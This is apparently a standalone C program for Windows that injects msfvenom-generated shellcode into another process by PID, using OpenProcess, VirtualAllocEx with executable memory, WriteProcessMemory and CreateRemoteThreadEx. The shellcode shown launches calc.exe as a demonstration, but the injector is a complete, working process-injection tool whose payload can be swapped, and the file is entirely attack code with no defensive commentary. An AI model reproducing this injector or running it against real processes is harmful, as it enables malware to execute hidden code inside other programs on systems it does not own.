#include <Windows.h>
#include <stdio.h>


int main(int argc, char* argv[]) {

	if (argc < 2) {
		printf("[-] usage: %s <PID>\n", argv[0]);
	}

	// msfvenom --platform windows -a x86 -p windows/exec CMD="calc.exe" -f c --var-name=shellcode
	unsigned char shellcode[] =
		"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50"
		"\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26"
		"\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7"
		"\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78"
		"\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3"
		"\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
		"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58"
		"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3"
		"\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a"
		"\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d"
		"\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb"
		"\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"
		"\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
		"\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

	DWORD PID = atoi(argv[1]);
	DWORD TID = NULL;

	printf("[*] Open Process Handle (%ld)\n", PID);

	HANDLE hProcess = OpenProcess(
		/*  DWORD dwDesiredAccess */ PROCESS_ALL_ACCESS,
		/*  BOOL  bInheritHandle  */ false,
		/*  DWORD dwProcessId     */ PID
	);

	if (hProcess == nullptr) {
		printf("[-] Open Process Error: 0x%lx", GetLastError());
		return EXIT_FAILURE;
	}

	printf("[+] Get Process Handle: 0x%p\n", hProcess);

	PVOID Buffer = VirtualAllocEx(
		/* HANDLE hProcess         */ hProcess,
		/* LPVOID lpAddress        */ nullptr,
		/* SIZE_T dwSize           */ sizeof(shellcode),
		/* DWORD  flAllocationType */ (MEM_RESERVE | MEM_COMMIT),
		/* DWORD  flProtect        */ PAGE_EXECUTE_READWRITE
	);
	printf("[+] Allocated %zd bytes for PID %d\n", sizeof(shellcode), PID);

	WriteProcessMemory(
		/* HANDLE  hProcess                */ hProcess,
		/* LPVOID  lpBaseAddress           */ Buffer,
		/* LPCVOID lpBuffer                */ shellcode,
		/* SIZE_T  nSize                   */ sizeof(shellcode),
		/* SIZE_T  *lpNumberOfBytesWritten */ nullptr
	);
	printf("[+] wrote shellcode to allocated buffer\n");

	HANDLE hThread = CreateRemoteThreadEx(
		/* HANDLE                       hProcess           */ hProcess,
		/* LPSECURITY_ATTRIBUTES        lpThreadAttributes */ nullptr,
		/* SIZE_T                       dwStackSize        */ 0,
		/* LPTHREAD_START_ROUTINE       lpStartAddress     */ (LPTHREAD_START_ROUTINE)Buffer,
		/* LPVOID                       lpParameter        */ nullptr,
		/* DWORD                        dwCreationFlags    */ 0,
		/* LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList    */ 0,
		/* LPDWORD                      lpThreadId         */ &TID
	);

	if (hThread == NULL) {
		printf("[-] Failed to get a new handle: %ld", GetLastError());
		return EXIT_FAILURE;
	}

	printf("[+] Got a handle for a new thread (%ld)---0x%p\n", TID, hProcess);

	WaitForSingleObject(hThread, INFINITE);

	CloseHandle(hThread);
	CloseHandle(hProcess);
	printf("[+] finished!\n");

	return EXIT_SUCCESS;
}